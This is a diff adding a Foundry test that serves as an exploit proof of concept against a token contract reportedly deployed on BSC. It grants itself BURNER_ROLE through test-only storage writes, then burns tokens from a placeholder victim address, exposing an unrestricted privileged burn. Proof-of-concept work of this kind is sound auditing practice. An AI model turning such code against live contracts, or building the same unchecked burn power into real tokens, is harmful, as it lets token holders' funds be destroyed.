@@ -1,0 +1,70 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the SecondToken functions we need
+interface ISecondToken {
+    function burn(address account, uint256 amount) external;
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function BURNER_ROLE() external view returns (bytes32);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract on BSC
+    address constant TARGET = 0xfD77214b4A1aa6f962972cBe65fB179c501d9094;
+
+    ISecondToken public token;
+
+    // Victim address (random EOA)
+    address victim = address(0xdead000000000000000000000000000000000001);
+
+    function setUp() public {
+        token = ISecondToken(TARGET);
+
+        // Grant BURNER_ROLE to this test contract by directly writing to storage
+        // Storage layout: _roles mapping is at slot 5 (inheritance order: ERC20 slots 0-4, AccessControl slot 5)
+        bytes32 burnerRole = token.BURNER_ROLE();
+        uint256 baseSlot = 5;
+        bytes32 roleDataSlot = keccak256(abi.encode(burnerRole, baseSlot));
+        // members mapping base slot is roleDataSlot (adminRole stored at same slot, but we skip)
+        bytes32 memberSlot = keccak256(abi.encode(address(this), uint256(roleDataSlot)));
+        vm.store(TARGET, memberSlot, bytes32(uint256(1))); // set to true
+
+        // Label addresses for readability
+        vm.label(TARGET, "SecondToken");
+        vm.label(address(this), "Attacker");
+        vm.label(victim, "Victim");
+    }
+
+    function testExploitBurn() public {
+        // Give the victim some tokens by directly writing to _balances mapping (slot 0)
+        uint256 victimBalance = 1000 * 1e18;
+        bytes32 balanceSlot = keccak256(abi.encode(victim, uint256(0)));
+        vm.store(TARGET, balanceSlot, bytes32(victimBalance));
+
+        // Verify initial balances
+        uint256 initialVictimBal = token.balanceOf(victim);
+        uint256 initialTotalSupply = token.totalSupply();
+        assertEq(initialVictimBal, victimBalance, "Victim should have tokens");
+
+        // Now burn 500 tokens from victim
+        uint256 burnAmount = 500 * 1e18;
+        token.burn(victim, burnAmount);
+
+        // Check post-burn state
+        uint256 finalVictimBal = token.balanceOf(victim);
+        uint256 finalTotalSupply = token.totalSupply();
+
+        // Victim lost exactly burnAmount
+        assertEq(finalVictimBal, victimBalance - burnAmount, "Victim balance should decrease");
+        // Total supply decreased by same amount
+        assertEq(finalTotalSupply, initialTotalSupply - burnAmount, "Total supply should decrease");
+
+        // Emit a log to highlight success
+        emit log("Exploit success: BURNER_ROLE holder burned tokens from a victim address.");
+    }
+}
+```
